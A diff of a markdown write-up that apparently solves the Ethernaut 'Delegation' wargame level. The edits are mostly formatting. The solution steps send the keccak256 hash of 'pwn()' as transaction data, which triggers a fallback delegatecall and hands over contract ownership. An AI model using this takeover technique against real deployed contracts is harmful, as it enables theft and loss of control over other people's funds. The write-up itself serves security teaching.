@@ -101,25 +101,25 @@ Here is briefly the timeline of exploit:
     
 * but the storage of the Delegation contract is used.
     
-* Updates `owner == msg.sender` according to the `pwn()` function in the delegation contract.
+* Updates `owner = msg.sender(us)` according to the `pwn()` function in the delegation contract.
     
 
 ### Solution
 
-* Create a new level instance and open up console.
+* Create a new level instance and open up the console.
     
 * ```solidity
-    var attack = web3.utils.keccak256("pwn()") //saves hashed pwn() in attack.
-    //we require the hashed version of pwn() to pass it as msg.data.
+      var attack = web3.utils.keccak256("pwn()") //saves hashed pwn() in attack.
+      //we require the hashed version of pwn() to pass it as msg.data.
     ```
     
 * ```solidity
-    contract.sendTransaction({data: attack}) //sending a transaction with msg.data as attack which will trigger the pwn() function. 
-    //Since, there is no function to accept the transaction, it will trigger the fallback function which will delegate it and....Ah Shit, here we go again. 
+      contract.sendTransaction({data: attack}) //sending a transaction with msg.data as attack which will trigger the pwn() function. 
+      //Since, there is no function to accept the transaction, it will trigger the fallback function which will delegate it and....Ah Shit, here we go again.
     ```
     
 * ```solidity
-    await contract.owner() //check whether you are the owner. 
+      await contract.owner() //check whether you are the owner.
     ```
     
 * Submit Instance.
